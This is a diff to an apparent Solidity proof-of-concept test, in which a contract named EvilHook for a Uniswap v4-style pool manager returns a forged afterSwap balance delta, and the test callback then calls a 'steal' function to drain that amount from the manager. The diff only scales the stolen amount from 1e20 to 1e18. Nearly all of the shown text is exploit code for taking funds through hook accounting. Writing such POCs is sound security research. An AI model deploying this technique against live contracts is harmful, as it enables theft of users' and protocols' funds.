@@ -28,9 +28,8 @@ contract EvilHook {
     function steal(Currency c, address to, uint128 amt) external {
         manager.take(c, to, amt);
     }
-    function afterSwap(address, PoolKey calldata, SwapParams calldata, BalanceDelta, bytes calldata) external returns (bytes4, BalanceDelta) {
-        // return 1e20 hook delta
-        return (IHooks.afterSwap.selector, toBalanceDelta(int128(int256(1e20)), int128(0)));
+    function afterSwap(address, PoolKey calldata, SwapParams calldata, BalanceDelta, bytes calldata) external pure returns (bytes4, BalanceDelta) {
+        return (IHooks.afterSwap.selector, toBalanceDelta(int128(int256(1e18)), int128(0)));
     }
 }
 
@@ -69,9 +68,9 @@ contract POC is Test {
             else if(s.amount0()>0) manager.take(c0, address(this), uint128(s.amount0()));
             if(s.amount1()<0){manager.sync(c1); token1.mint(address(manager), uint128(-s.amount1())); manager.settle();}
             else if(s.amount1()>0) manager.take(c1, address(this), uint128(s.amount1()));
-            // NOW STEAL HOOK'S 1e20 AS HOOK - no prank needed
-            try hook.steal(c0, address(this), 1e20) {} catch {}
-            try hook.steal(c1, address(this), 1e20) {} catch {}
+            // steal hook's 1e18 as hook - no prank needed
+            try hook.steal(c0, address(this), 1e18) {} catch {}
+            try hook.steal(c1, address(this), 1e18) {} catch {}
         }
         return "";
     }
